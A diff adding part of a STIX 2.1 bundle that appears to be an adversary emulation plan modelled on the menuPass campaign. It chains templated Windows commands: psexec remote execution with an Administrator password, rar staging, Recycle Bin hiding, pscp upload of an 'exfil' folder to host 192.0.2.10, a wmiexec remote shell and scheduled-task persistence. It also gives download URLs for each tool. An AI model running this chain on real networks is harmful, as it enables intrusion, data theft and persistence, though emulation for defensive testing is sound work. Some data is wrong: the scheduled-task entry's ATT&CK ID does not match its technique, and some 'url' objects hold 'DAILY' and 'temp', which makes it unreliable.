+            "description": "Using compiled psexec.py to achieve remote code execution",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1569.002",
+                    "input_arguments": {
+                        "psexec_cmd": {
+                            "default": "-c d.exe\n",
+                            "description": "PsExec argument for specifying executable",
+                            "type": "String"
+                        },
+                        "psexec_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of psexec.exe",
+                            "type": "Path"
+                        },
+                        "psexec_password": {
+                            "default": "badpassword123\n",
+                            "description": "Password for psexec authentication",
+                            "type": "String"
+                        },
+                        "psexec_remote_host": {
+                            "default": "192.0.2.10\n",
+                            "description": "IP or hostname for PsExec connection",
+                            "type": "String"
+                        },
+                        "psexec_url": {
+                            "default": "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe",
+                            "description": "URL to download psexec.exe binary",
+                            "type": "URL"
+                        },
+                        "psexec_user": {
+                            "default": "Administrator\n",
+                            "description": "User for psexec authentication",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{psexec_local_path}\\psexec.exe\" \"#{psexec_user}\":\"#{psexec_password}\"@\"#{psexec_remote_host}\" \"#{psexec_cmd}\"\n",
+                                "payloads": [
+                                    "psexec.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Services: Service Execution"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3c102732-dcaf-4e30-9f38-94c2824af04a",
+            "created": "2024-02-04T20:40:57.779076Z",
+            "modified": "2024-02-04T20:40:57.779076Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--01c69ac8-0e2f-4ba9-bcdd-4d3f48a77845",
+            "created": "2024-02-04T20:40:57.779518Z",
+            "modified": "2024-02-04T20:40:57.779518Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "url--c8eb1d27-0f6b-5a5c-b5be-31d75c71db35"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--c8eb1d27-0f6b-5a5c-b5be-31d75c71db35",
+            "value": "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--357aa441-b035-4579-8cda-f3e2bdafbed5",
+            "created": "2024-02-04T20:40:57.780001Z",
+            "modified": "2024-02-04T20:40:57.780001Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "user-account--edd59c04-d2ad-511d-9f7b-63a53e1ddc75"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--edd59c04-d2ad-511d-9f7b-63a53e1ddc75",
+            "account_login": "Administrator\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8b6600c7-1630-452d-a921-7b30d22d2dbb",
+            "created": "2024-02-04T20:40:57.780874Z",
+            "modified": "2024-02-04T20:40:57.780874Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "user-account--aafc9125-7dbc-4d48-835f-e146251a977c"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--aafc9125-7dbc-4d48-835f-e146251a977c",
+            "credential": "badpassword123\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6019c634-3384-42f4-b855-e737ac914daf",
+            "created": "2024-02-04T20:40:57.781722Z",
+            "modified": "2024-02-04T20:40:57.781722Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2f4e4022-7c5d-4797-ade7-63a820e86507",
+            "created": "2024-02-04T20:40:57.782094Z",
+            "modified": "2024-02-04T20:40:57.782094Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d10b37c0-7fc7-419a-929e-3440875e8017",
+            "created": "2024-02-04T20:40:57.782396Z",
+            "modified": "2024-02-04T20:40:57.782396Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
+            "created": "2024-02-04T20:40:57.782652Z",
+            "modified": "2024-02-04T20:40:57.782652Z",
+            "name": "Archive Collected Data - Archive via Utility",
+            "description": "Compress and stage data for exfiltration",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1560.001",
+                    "input_arguments": {
+                        "rar_archive_name": {
+                            "default": "ss.rar\n",
+                            "description": "Name of rar archive",
+                            "type": "String"
+                        },
+                        "rar_files": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path to files to compress",
+                            "type": "Path"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "rar.exe a \"#{rar_archive_name}\" \"#{rar_files}\"\n",
+                                "payloads": [
+                                    "rar.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Archive Collected Data - Archive via Utility"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f9e8bbe7-3360-47ea-8639-103e96220621",
+            "created": "2024-02-04T20:40:57.783013Z",
+            "modified": "2024-02-04T20:40:57.783013Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--70298eac-36be-4b96-ac94-4f1946cba0fa",
+            "created": "2024-02-04T20:40:57.783764Z",
+            "modified": "2024-02-04T20:40:57.783764Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d0dd52bc-6294-4e21-af3f-5e8a5c2770f9",
+            "created": "2024-02-04T20:40:57.783981Z",
+            "modified": "2024-02-04T20:40:57.783981Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--160a1e0f-0f9b-49bb-a0fe-7e362b51737f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b4fa6d2e-ed9c-4a86-81aa-19331983fe0d",
+            "created": "2024-02-04T20:40:57.784162Z",
+            "modified": "2024-02-04T20:40:57.784162Z",
+            "name": "Recycle Bin Staging",
+            "description": "menuPass actors are thought to have staged archives in the Recycle Bin for exfiltration.",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1074.001",
+                    "input_arguments": {
+                        "copy_filename": {
+                            "default": "aa.rar\n",
+                            "description": "Name of file to copy",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "copy #{copy_filename} \"C:\\$Recycle.Bin\\\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Local Data Staging"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--934978b9-e5a3-4168-9d6a-527f04771862",
+            "created": "2024-02-04T20:40:57.784548Z",
+            "modified": "2024-02-04T20:40:57.784548Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b4fa6d2e-ed9c-4a86-81aa-19331983fe0d",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e5eeb9a4-b7e5-457e-b1d5-16ad711d535d",
+            "created": "2024-02-04T20:40:57.784874Z",
+            "modified": "2024-02-04T20:40:57.784874Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--b4fa6d2e-ed9c-4a86-81aa-19331983fe0d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "created": "2024-02-04T20:40:57.785056Z",
+            "modified": "2024-02-04T20:40:57.785056Z",
+            "name": "Transfer Data to Cloud Account",
+            "description": "Exfil data to cloud account",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1537",
+                    "input_arguments": {
+                        "pscp_drop_location": {
+                            "default": "temp\n",
+                            "description": "Path where to download pscp.exe",
+                            "type": "Path"
+                        },
+                        "pscp_exfil_files": {
+                            "default": "C:\\Windows\\Temp\\exfil\n",
+                            "description": "Path of files to be sent with pscp",
+                            "type": "Path"
+                        },
+                        "pscp_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Local path to pscp.exe",
+                            "type": "Path"
+                        },
+                        "pscp_server": {
+                            "default": "192.0.2.10\n",
+                            "description": "IP or hostname of remote host to connect via pscp",
+                            "type": "String"
+                        },
+                        "pscp_url": {
+                            "default": "https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe",
+                            "description": "Path to download pscp.exe",
+                            "type": "URL"
+                        },
+                        "pscp_user": {
+                            "default": "Administrator\n",
+                            "description": "Remote username",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{pscp_local_path}\\pscp.exe\" \"#{pscp_exfil_files}\" \"#{pscp_user}\"@\"#{pscp_server}\":/\"#{pscp_drop_location}\"\n",
+                                "payloads": [
+                                    "pscp.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Transfer Data to Cloud Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--79c72057-2dcb-47c4-8834-55f2b4246c20",
+            "created": "2024-02-04T20:40:57.785675Z",
+            "modified": "2024-02-04T20:40:57.785675Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "url--f5c26f53-a483-5804-ac87-19d2cab332b7"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--f5c26f53-a483-5804-ac87-19d2cab332b7",
+            "value": "https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6e337dd5-06d6-4535-81e5-c3cbc13b66c2",
+            "created": "2024-02-04T20:40:57.786267Z",
+            "modified": "2024-02-04T20:40:57.786267Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--aca468da-2e1e-4128-83f8-3f3602d6ecc4",
+            "created": "2024-02-04T20:40:57.78678Z",
+            "modified": "2024-02-04T20:40:57.78678Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "directory--2898736f-6abf-5836-bd10-49c48c434bfd"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--2898736f-6abf-5836-bd10-49c48c434bfd",
+            "path": "C:\\Windows\\Temp\\exfil\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--486f260f-a9f3-450b-9fc9-87f86c15694d",
+            "created": "2024-02-04T20:40:57.787518Z",
+            "modified": "2024-02-04T20:40:57.787518Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "user-account--edd59c04-d2ad-511d-9f7b-63a53e1ddc75"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--edd59c04-d2ad-511d-9f7b-63a53e1ddc75",
+            "account_login": "Administrator\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--153cd678-b9da-45bb-aa3f-8f0567d898bc",
+            "created": "2024-02-04T20:40:57.788024Z",
+            "modified": "2024-02-04T20:40:57.788024Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1b6895b8-d9ec-4c7c-bbc8-3ccc16c5ed86",
+            "created": "2024-02-04T20:40:57.788543Z",
+            "modified": "2024-02-04T20:40:57.788543Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
+            "target_ref": "url--9440158b-404b-54c8-afd2-16383f78d093"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--9440158b-404b-54c8-afd2-16383f78d093",
+            "value": "temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--86e96da9-370a-4cc9-aa80-2ea9b3280534",
+            "created": "2024-02-04T20:40:57.788825Z",
+            "modified": "2024-02-04T20:40:57.788825Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--ea4bc858-ba13-4f97-9df3-c543d8f3d44c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--8911d502-747a-4155-adcd-b03a1f284ee7",
+            "created": "2024-02-04T20:40:57.789006Z",
+            "modified": "2024-02-04T20:40:57.789006Z",
+            "name": "Windows Management Instrumentation",
+            "description": "Using wmiexec.vbs to execute tactical malware",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1047",
+                    "input_arguments": {
+                        "wmiexec_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of wmiexec.vbs",
+                            "type": "Path"
+                        },
+                        "wmiexec_remote_host": {
+                            "default": "192.0.2.10\n",
+                            "description": "Hostname or IP of remote host",
+                            "type": "String"
+                        },
+                        "wmiexec_url": {
+                            "default": "https://raw.githubusercontent.com/Twi1ight/AD-Pentest-Script/master/wmiexec.vbs\n",
+                            "description": "Path to download wmiexec.vbs",
+                            "type": "URL"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "cscript.exe \"#{wmiexec_local_path}\\wmiexec.vbs\" /shell \"#{wmiexec_remote_host}\"\n",
+                                "payloads": [
+                                    "wmiexec.vbs"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Windows Management Instrumentation"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--dab79e47-1724-4856-a0ca-c4e02a957e65",
+            "created": "2024-02-04T20:40:57.789645Z",
+            "modified": "2024-02-04T20:40:57.789645Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8911d502-747a-4155-adcd-b03a1f284ee7",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--50cceef0-3bb5-4f0a-8e8c-8f1738ff7b4b",
+            "created": "2024-02-04T20:40:57.790245Z",
+            "modified": "2024-02-04T20:40:57.790245Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8911d502-747a-4155-adcd-b03a1f284ee7",
+            "target_ref": "url--7eb0897d-80ff-5cdf-89f4-3b3eb48ca563"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--7eb0897d-80ff-5cdf-89f4-3b3eb48ca563",
+            "value": "https://raw.githubusercontent.com/Twi1ight/AD-Pentest-Script/master/wmiexec.vbs\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0bb7d1ff-7f11-4513-a0a3-b64489c51b72",
+            "created": "2024-02-04T20:40:57.79111Z",
+            "modified": "2024-02-04T20:40:57.79111Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8911d502-747a-4155-adcd-b03a1f284ee7",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1263f599-3728-46c1-ab04-bc1639d231c4",
+            "created": "2024-02-04T20:40:57.791346Z",
+            "modified": "2024-02-04T20:40:57.791346Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--8911d502-747a-4155-adcd-b03a1f284ee7"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c",
+            "created": "2024-02-04T20:40:57.791529Z",
+            "modified": "2024-02-04T20:40:57.791529Z",
+            "name": "Scheduled Task Persistence",
+            "description": "menuPass is reported to have used scheduled tasks to persist",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1553.005",
+                    "input_arguments": {
+                        "schtask_schedule": {
+                            "default": "DAILY\n",
+                            "description": "Value that specifies the schedule frequency. (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONLOGON, ONIDLE, and ONEVENT)",
+                            "type": "String"
+                        },
+                        "schtask_taskname": {
+                            "default": "taskname\n",
+                            "description": "A value that specifies a name which uniquely identifies the scheduled task.",
+                            "type": "String"
+                        },
+                        "schtask_taskrun": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "A value that specifies the path and file name of the task to be run at the scheduled time.",
+                            "type": "Path"
+                        },
+                        "schtask_username": {
+                            "default": "username\n",
+                            "description": "A value that specifies the user context under which the task runs.",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "schtasks /create /sc \"#{schtask_schedule}\" /tn \"#{schtask_taskname}\" /tr \"#{schtask_taskrun}\" /ru \"#{schtask_username}\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Scheduled Task/Job: Scheduled Task"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6ab33790-f0e0-4279-aa7c-9c4447528ada",
+            "created": "2024-02-04T20:40:57.792074Z",
+            "modified": "2024-02-04T20:40:57.792074Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c",
+            "target_ref": "url--d68a48c3-d2ee-59c3-9382-66dd9d9c7ca2"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--d68a48c3-d2ee-59c3-9382-66dd9d9c7ca2",
+            "value": "DAILY\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4b09a5b7-f3f9-4449-967e-5a142e95dd8c",
+            "created": "2024-02-04T20:40:57.792337Z",
+            "modified": "2024-02-04T20:40:57.792337Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c",
+            "target_ref": "url--d68a48c3-d2ee-59c3-9382-66dd9d9c7ca2"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--d68a48c3-d2ee-59c3-9382-66dd9d9c7ca2",
+            "value": "DAILY\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e213d2e4-07c0-4cab-bfe5-1e3b77e5700b",
+            "created": "2024-02-04T20:40:57.792906Z",
+            "modified": "2024-02-04T20:40:57.792906Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--aaf846e0-69d8-45c5-b5ad-268c9345055a",
+            "created": "2024-02-04T20:40:57.793623Z",
+            "modified": "2024-02-04T20:40:57.793623Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c",
+            "target_ref": "user-account--322f9c26-f146-5ab0-90af-bc1c8fd3c6d7"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--322f9c26-f146-5ab0-90af-bc1c8fd3c6d7",
+            "account_login": "username\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f9807ff5-ecc5-4a9d-be31-f271b04e1ae3",
+            "created": "2024-02-04T20:40:57.793942Z",
+            "modified": "2024-02-04T20:40:57.793942Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--236d1357-64f9-4a98-afc1-bccaa89aba8c"
+        }
+    ]
+}
